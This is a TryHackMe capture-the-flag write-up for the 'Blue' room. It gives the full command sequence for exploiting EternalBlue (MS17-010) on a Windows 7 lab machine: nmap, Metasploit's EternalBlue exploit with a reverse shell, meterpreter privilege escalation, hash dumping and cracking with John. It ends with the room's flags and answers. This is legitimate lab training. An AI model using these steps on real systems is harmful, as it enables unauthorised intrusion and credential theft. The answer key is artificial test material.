# 🟦 TryHackMe — Blue Writeup

**Category:** Windows Exploitation  
**Difficulty:** Easy  
**Author:** Madhav Garg  
**Room:** Blue (TryHackMe)

---

## 📘 Room Summary

This room focuses on exploiting a Windows 7 machine vulnerable to the EternalBlue (MS17-010) SMB vulnerability.  
You will:

- Perform reconnaissance  
- Identify MS17-010  
- Exploit using Metasploit  
- Convert shell → meterpreter  
- Escalate privileges  
- Dump & crack Windows hashes  
- Hunt for flags across the system  

This writeup contains the complete process, commands, reasoning, and final answers.

---

# 🛠 Tools & Resources Used

- Nmap  
- Metasploit  
- John the Ripper  
- Windows enumeration  
- Linux terminal  
- Notes & screenshots (place in `screenshots/`)

---

# 🔍 Full Attack Walkthrough

## 1) Reconnaissance (Nmap Scan)

```
nmap -sS -Pn -A -p- -T5 <TARGET-IP>
```

Open ports under 1000: **3**

---

## 2) Detecting MS17-010

```
nmap -sS -Pn -p 445 <TARGET-IP> --script smb-vuln-ms17-010.nse
```

Vulnerability found: **ms17-010**

---

## 3) Exploiting EternalBlue

Start Metasploit:

```
msfconsole
```

Search the exploit:

```
search ms17-010
```

Exploit path:

**exploit/windows/smb/ms17_010_eternalblue**

Required option:

**RHOSTS**

Set payload:

```
set payload windows/x64/shell/reverse_tcp
```

Run exploit:

```
run
```

Background shell: `CTRL + Z`

---

## 4) Convert Shell → Meterpreter

```
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
options
```

Required option:

**SESSION**

Run module:

```
run
sessions -i 1
```

Privilege escalation check:

```
getsystem
whoami
```

List processes:

```
ps
```

Migrate:

```
migrate <PROCESS_ID>
```

---

## 5) Cracking Passwords

Dump hashes:

```
hashdump
```

Non-default user: **Jon**

Crack password:

```
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Cracked password: **alqfna22**

---

# 🏁 Flags

**Flag 1:** flag{access_the_machine}  
**Flag 2:** flag{sam_database_elevated_access}  
**Flag 3:** flag{admin_documents_can_be_valuable}

---

# 📝 Final Answers

1. Ports open under 1000 → **3**  
2. Vulnerability → **ms17-010**  
3. Exploit path → **exploit/windows/smb/ms17_010_eternalblue**  
4. Required option → **RHOSTS**  
5. User → **Jon**  
6. Password → **alqfna22**  
7. Flag 1 → flag{access_the_machine}  
8. Flag 2 → flag{sam_database_elevated_access}  
9. Flag 3 → flag{admin_documents_can_be_valuable}


---

Writeup by **Madhav Garg**  
Room: **Blue — TryHackMe**
